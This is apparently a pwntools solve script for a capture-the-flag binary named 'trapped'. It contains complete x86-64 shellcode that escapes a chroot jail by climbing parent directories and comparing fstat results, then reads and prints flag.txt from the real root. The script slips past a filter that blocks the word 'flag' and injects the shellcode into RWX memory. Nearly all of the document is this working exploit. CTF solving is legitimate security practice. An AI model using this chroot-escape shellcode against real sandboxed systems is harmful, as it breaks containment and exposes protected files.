#!/usr/bin/env python3
from pwn import *
import os, sys

# Run with: sudo -E python3 solve_local.py
#   or grant the binary: sudo setcap cap_sys_chroot+ep ./trapped

context.clear(arch='amd64', os='linux', log_level='info')

asm_sc = asm(r'''
.intel_syntax noprefix
.p2align 0

/* print a tiny banner so we know code ran */
    mov eax, 1              /* write */
    mov edi, 1
    lea rsi, [rip+BANNER]
    mov edx, 4
    syscall

/* cur = openat(AT_FDCWD, ".", O_DIRECTORY) */
    mov rdi, -100           /* AT_FDCWD */
    lea rsi, [rip+DOT]
    mov edx, 0x20000        /* O_DIRECTORY */
    mov eax, 257            /* openat */
    syscall
    mov r15, rax            /* r15 = cur fd */

/* loop: climb to real / using fstat(cur) vs fstat(parent) */
rootwalk:
    /* fstat(cur, &st_cur) */
    mov rdi, r15
    lea rsi, [rip+ST_CUR]
    mov eax, 5              /* fstat */
    syscall

    /* parent = openat(cur, "..", O_DIRECTORY) */
    mov rdi, r15
    lea rsi, [rip+DOTDOT]
    mov edx, 0x20000        /* O_DIRECTORY */
    mov eax, 257            /* openat */
    syscall
    mov r14, rax            /* r14 = parent fd */

    /* fstat(parent, &st_par) */
    mov rdi, r14
    lea rsi, [rip+ST_PAR]
    mov eax, 5              /* fstat */
    syscall

    /* compare st_dev (qword 0) and st_ino (qword 1) */
    mov rax, qword ptr [rip+ST_CUR+0]
    mov rbx, qword ptr [rip+ST_PAR+0]
    cmp rax, rbx
    jne not_root
    mov rax, qword ptr [rip+ST_CUR+8]
    mov rbx, qword ptr [rip+ST_PAR+8]
    cmp rax, rbx
    jne not_root

    /* reached root: use r14 as root_fd; close old cur */
    mov rdi, r15
    mov eax, 3              /* close */
    syscall
    mov r15, r14
    jmp have_root

not_root:
    /* move up one: close(cur); cur = parent; repeat */
    mov rdi, r15
    mov eax, 3              /* close */
    syscall
    mov r15, r14
    jmp rootwalk

have_root:
    /* openat(root_fd, "flag.txt", O_RDONLY) */
    mov rdi, r15
    lea rsi, [rip+FLAG]
    xor edx, edx            /* O_RDONLY */
    mov eax, 257            /* openat */
    syscall
    /* read(fd, buf, 4096) */
    mov rdi, rax
    lea rsi, [rip+BUF]
    mov edx, 4096
    xor eax, eax            /* read */
    syscall
    /* write(1, buf, n) */
    mov edx, eax
    mov edi, 1
    lea rsi, [rip+BUF]
    mov eax, 1              /* write */
    syscall

    /* exit(0) */
    xor edi, edi
    mov eax, 60
    syscall

/* --- data --- */
BANNER:  .ascii "[*]\n"
DOT:     .ascii ".\0"
DOTDOT:  .ascii "..\0"
FLAG:    .ascii "flag.txt\0"     /* relative to / */
.balign 8
ST_CUR:  .space 200          /* struct stat scratch */
ST_PAR:  .space 200
BUF:     .space 4096
''')

def main():
    binpath = './trapped'
    if not (os.path.exists(binpath) and os.access(binpath, os.X_OK)):
        log.error('Local binary "%s" not found or not executable.', binpath)

    io = process([binpath])

    # send benign filename (filter blocks strings containing "flag")
    io.send(b"ok\n")

    # send raw shellcode; program read()s it into RWX and jumps
    io.send(asm_sc)

    # close write-end so read() returns and execution jumps to our buffer
    io.shutdown('send')

    out = io.recvall(timeout=5).decode('utf-8', errors='ignore')
    print(out)

    if "Operation not permitted" in out and "chroot" in out:
        log.warning('Got "Operation not permitted" from chroot. Run with sudo OR: sudo setcap cap_sys_chroot+ep ./trapped')

if __name__ == "__main__":
    main()
